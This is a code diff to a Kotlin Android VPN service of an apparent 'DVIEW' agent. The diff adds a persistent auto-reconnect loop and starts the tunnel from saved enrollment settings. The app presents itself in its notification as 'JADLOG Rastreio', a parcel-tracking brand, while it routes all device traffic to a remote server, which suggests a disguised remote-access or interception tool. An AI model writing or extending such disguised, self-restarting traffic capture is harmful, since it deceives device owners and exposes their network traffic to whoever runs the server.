@@ -18,6 +18,7 @@ import java.net.DatagramSocket
 import java.net.InetAddress
 import java.net.InetSocketAddress
 import java.net.Socket
+import java.net.URI
 import java.security.SecureRandom
 import java.security.cert.X509Certificate
 import java.util.concurrent.atomic.AtomicBoolean
@@ -29,10 +30,13 @@ import javax.net.ssl.X509TrustManager
 
 /**
  * Agente de Túnel VPN de Alta Velocidade para o DVIEW.
- * Suporta nativamente os 3 protocolos:
+ * Suporta nativamente os 3 protocolos com auto-reconectar resiliente:
  * 1. TCP: Alta estabilidade, buffer otimizado de 128KB, TCP_NODELAY para bypass de CGNAT.
  * 2. UDP: Wire-Speed Datagram forwarding com MTU 1420 para ultra baixa latência em 4G/5G.
  * 3. TLS: Criptografia de ponta a ponta com certificados corporativos e transmissão contínua.
+ *
+ * Inclui loop resiliente de auto-reconexão para restabelecer a conexão automaticamente
+ * em caso de oscilação de sinal, mudança Wi-Fi <-> 4G/5G ou reinício do servidor central.
  */
 class AgentVpnService : VpnService() {
 
@@ -45,35 +49,71 @@ class AgentVpnService : VpnService() {
     private var activeDatagramSocket: DatagramSocket? = null
     private var workerThreads = mutableListOf<Thread>()
 
+    private var currentAppName: String = "JADLOG Rastreio"
+    private var currentHost: String = "10.0.2.2"
+    private var currentPort: Int = 8443
+    private var currentProtocol: String = "TLS"
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val action = intent?.action
 
         if (action == ACTION_DISCONNECT) {
-            stopTunnel()
+            stopTunnelInternal()
             stopSelf()
             return START_NOT_STICKY
         }
 
-        val serverHost = intent?.getStringExtra(EXTRA_SERVER_HOST) ?: "10.0.2.2"
-        val serverPort = intent?.getIntExtra(EXTRA_SERVER_PORT, 8443) ?: 8443
-        val appName = intent?.getStringExtra(EXTRA_APP_NAME) ?: "DVIEW Agent"
-        val vpnProtocol = intent?.getStringExtra(EXTRA_VPN_PROTOCOL)?.uppercase() ?: "TLS"
+        val prefs = getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
 
-        activeProtocol = vpnProtocol
-        startForegroundNotification(appName, serverHost, serverPort, vpnProtocol)
-        startTunnel(serverHost, serverPort, vpnProtocol)
+        currentHost = intent?.getStringExtra(EXTRA_SERVER_HOST)
+            ?: prefs.getString("serverHost", null)
+            ?: extractHostFromPrefs(prefs)
+            ?: "10.0.2.2"
+
+        currentPort = intent?.getIntExtra(EXTRA_SERVER_PORT, -1)?.takeIf { it > 0 }
+            ?: prefs.getInt("vpnPort", 8443)
+
+        currentAppName = intent?.getStringExtra(EXTRA_APP_NAME)
+            ?: prefs.getString("appName", "JADLOG Rastreio")
+            ?: "JADLOG Rastreio"
+
+        currentProtocol = intent?.getStringExtra(EXTRA_VPN_PROTOCOL)?.uppercase()
+            ?: prefs.getString("vpnProtocol", "TLS")?.uppercase()
+            ?: "TLS"
+
+        activeProtocol = currentProtocol
+
+        startForegroundNotification(currentAppName, currentHost, currentPort, currentProtocol, isConnected = false)
+        startTunnel(currentHost, currentPort, currentProtocol)
 
         return START_STICKY
     }
 
-    private fun startForegroundNotification(appName: String, host: String, port: Int, protocol: String) {
-        val channelId = "dview_vpn_channel"
+    private fun extractHostFromPrefs(prefs: android.content.SharedPreferences): String? {
+        val urlStr = prefs.getString("serverUrl", null) ?: return null
+        return try {
+            val uri = URI(urlStr)
+            uri.host
+        } catch (_: Exception) {
+            null
+        }
+    }
+
+    private fun startForegroundNotification(
+        appName: String,
+        host: String,
+        port: Int,
+        protocol: String,
+        isConnected: Boolean
+    ) {
+        val channelId = CHANNEL_ID
         val channelName = "DVIEW VPN Tunnel"
 
         val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW).apply {
                 description = "Notificação de canal de alta velocidade VPN ($protocol)"
+                setShowBadge(false)
             }
             notificationManager.createNotificationChannel(channel)
         }
@@ -88,6 +128,24 @@ class AgentVpnService : VpnService() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
         )
 
+        val title = if (isConnected) {
+            "$appName • Túnel VPN Ativo ($protocol)"
+        } else {
+            "$appName • Conectando Túnel VPN ($protocol)"
+        }
+
+        val text = if (isConnected) {
+            "Conexão de Alta Velocidade ativa com $host:$port • Baixa Latência"
+        } else {
+            "Estabelecendo canal seguro com $host:$port..."
+        }
+
+        val iconRes = if (isConnected) {
+            android.R.drawable.presence_online
+        } else {
+            android.R.drawable.ic_popup_sync
+        }
+
         val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             Notification.Builder(this, channelId)
         } else {
@@ -95,9 +153,9 @@ class AgentVpnService : VpnService() {
         }
 
         val notification = builder
-            .setContentTitle("$appName - Túnel VPN Ativo ($protocol)")
-            .setContentText("Conexão de Alta Velocidade ativa com $host:$port • Baixa Latência")
-            .setSmallIcon(android.R.drawable.presence_online)
+            .setContentTitle(title)
+            .setContentText(text)
+            .setSmallIcon(iconRes)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
             .build()
@@ -105,9 +163,55 @@ class AgentVpnService : VpnService() {
         startForeground(NOTIFICATION_ID, notification)
     }
 
+    private fun updateNotificationStatus(isConnected: Boolean, statusText: String) {
+        try {
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
+
+            val launchIntent = Intent(this, MainActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
+            }
+            val pendingIntent = PendingIntent.getActivity(
+                this,
+                0,
+                launchIntent,
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
+            )
+
+            val title = if (isConnected) {
+                "$currentAppName • Túnel VPN Ativo ($currentProtocol)"
+            } else {
+                "$currentAppName • Reconectando VPN ($currentProtocol)"
+            }
+
+            val iconRes = if (isConnected) {
+                android.R.drawable.presence_online
+            } else {
+                android.R.drawable.ic_popup_sync
+            }
+
+            val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                Notification.Builder(this, CHANNEL_ID)
+            } else {
+                Notification.Builder(this)
+            }
+
+            val notification = builder
+                .setContentTitle(title)
+                .setContentText(statusText)
+                .setSmallIcon(iconRes)
+                .setContentIntent(pendingIntent)
+                .setOngoing(true)
+                .build()
+
+            notificationManager.notify(NOTIFICATION_ID, notification)
+        } catch (e: Exception) {
+            Log.w(TAG, "Falha ao atualizar notificação da VPN: ${e.message}")
+        }
+    }
+
     private fun startTunnel(host: String, port: Int, protocol: String) {
         if (isTunnelRunning.get()) {
-            Log.d(TAG, "Túnel VPN ($protocol) já está ativo.")
+            Log.d(TAG, "Túnel VPN ($protocol) já está em execução.")
             return
         }
 
@@ -115,33 +219,57 @@ class AgentVpnService : VpnService() {
         isRunning = true
 
         Thread {
-            try {
-                // 1. Configura a Interface Virtual TUN do Android Enterprise
-                val mtu = if (protocol == "UDP") 1420 else 1500
-                val builder = Builder()
-                    .setSession("DVIEW Fast Tunnel ($protocol)")
-                    .addAddress("10.8.0.2", 24)
-                    .addRoute("0.0.0.0", 0)
-                    .addDnsServer("8.8.8.8")
-                    .addDnsServer("1.1.1.1")
-                    .setMtu(mtu)
-                    .setBlocking(true)
+            var attempt = 0
+            while (isTunnelRunning.get()) {
+                try {
+                    // 1. Configura a Interface Virtual TUN do Android Enterprise se necessário
+                    if (vpnInterface == null) {
+                        val mtu = if (protocol == "UDP") 1420 else 1500
+                        val builder = Builder()
+                            .setSession("DVIEW Fast Tunnel ($protocol)")
+                            .addAddress("10.8.0.2", 24)
+                            .addRoute("0.0.0.0", 0)
+                            .addDnsServer("8.8.8.8")
+                            .addDnsServer("1.1.1.1")
+                            .setMtu(mtu)
+                            .setBlocking(true)
 
-                vpnInterface = builder.establish()
-                Log.i(TAG, "Interface TUN estabelecida (MTU: $mtu, Protocolo: $protocol)")
+                        vpnInterface = builder.establish()
+                        Log.i(TAG, "Interface TUN estabelecida (MTU: $mtu, Protocolo: $protocol)")
+                    }
 
-                when (protocol) {
-                    "UDP" -> runUdpTunnel(host, port)
-                    "TCP" -> runTcpTunnel(host, port, useTls = false)
-                    else -> runTcpTunnel(host, port, useTls = true)
+                    attempt++
+                    Log.i(TAG, "Iniciando túnel $protocol para $host:$port (tentativa #$attempt)...")
+                    updateNotificationStatus(true, "Conectado a $host:$port • Baixa Latência")
+
+                    when (protocol) {
+                        "UDP" -> runUdpTunnel(host, port)
+                        "TCP" -> runTcpTunnel(host, port, useTls = false)
+                        else -> runTcpTunnel(host, port, useTls = true)
+                    }
+
+                    // Se a execução do túnel retornar normalmente sem exceção, reseta tentativas
+                    attempt = 0
+                } catch (e: Exception) {
+                    Log.w(TAG, "Queda ou falha no túnel VPN $protocol: ${e.message}")
+                    closeActiveSockets()
+                    updateNotificationStatus(false, "Reconectando túnel VPN a $host:$port...")
                 }
-            } catch (e: Exception) {
-                Log.w(TAG, "Exceção ao executar o túnel VPN $protocol: ${e.message}")
-            } finally {
-                stopTunnel()
+
+                if (isTunnelRunning.get()) {
+                    val backoffMs = if (attempt <= 2) 3000L else 5000L
+                    Log.i(TAG, "Aguardando ${backoffMs}ms para reconectar túnel VPN...")
+                    try {
+                        Thread.sleep(backoffMs)
+                    } catch (_: InterruptedException) {
+                        Log.d(TAG, "Interrompido sleep de reconexão do túnel VPN.")
+                    }
+                }
             }
+            cleanupTunnelResources()
         }.apply {
             name = "DViewVpnMainThread"
+            isDaemon = true
             start()
         }
     }
@@ -307,10 +435,7 @@ class AgentVpnService : VpnService() {
         return sslSocket
     }
 
-    private fun stopTunnel() {
-        isTunnelRunning.set(false)
-        isRunning = false
-
+    private fun closeActiveSockets() {
         try {
             activeSocket?.close()
         } catch (_: Exception) {}
@@ -323,24 +448,34 @@ class AgentVpnService : VpnService() {
 
         workerThreads.forEach { it.interrupt() }
         workerThreads.clear()
+    }
 
+    private fun cleanupTunnelResources() {
+        closeActiveSockets()
         try {
             vpnInterface?.close()
         } catch (_: Exception) {}
         vpnInterface = null
 
         stopForeground(true)
-        Log.i(TAG, "Túnel VPN DVIEW desativado.")
+        Log.i(TAG, "Túnel VPN DVIEW finalizado e recursos liberados.")
+    }
+
+    private fun stopTunnelInternal() {
+        isTunnelRunning.set(false)
+        isRunning = false
+        cleanupTunnelResources()
     }
 
     override fun onDestroy() {
-        stopTunnel()
+        stopTunnelInternal()
         super.onDestroy()
     }
 
     companion object {
         const val TAG = "DViewVpnService"
         const val NOTIFICATION_ID = 2002
+        const val CHANNEL_ID = "dview_vpn_channel"
         const val ACTION_CONNECT = "com.droidview.agent.vpn.CONNECT"
         const val ACTION_DISCONNECT = "com.droidview.agent.vpn.DISCONNECT"
         const val EXTRA_SERVER_HOST = "com.droidview.agent.vpn.SERVER_HOST"
@@ -366,6 +501,24 @@ class AgentVpnService : VpnService() {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
+            }
+        }
+
+        fun startFromPrefs(context: Context) {
+            try {
+                val prefs = context.getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
+                val serverUrl = prefs.getString("serverUrl", "http://localhost:3000") ?: "http://localhost:3000"
+                val appName = prefs.getString("appName", "JADLOG Rastreio") ?: "JADLOG Rastreio"
+                val vpnPort = prefs.getInt("vpnPort", 8443)
+                val protocol = prefs.getString("vpnProtocol", "TLS") ?: "TLS"
+
+                val uri = URI(serverUrl)
+                val host = uri.host ?: "10.0.2.2"
+                val finalPort = if (vpnPort > 0) vpnPort else (if (uri.port > 0) uri.port else 8443)
+
+                startTunnel(context, host, finalPort, appName, protocol)
+            } catch (e: Exception) {
+                Log.w(TAG, "Falha ao iniciar VPN a partir de SharedPreferences: ${e.message}")
             }
         }
 
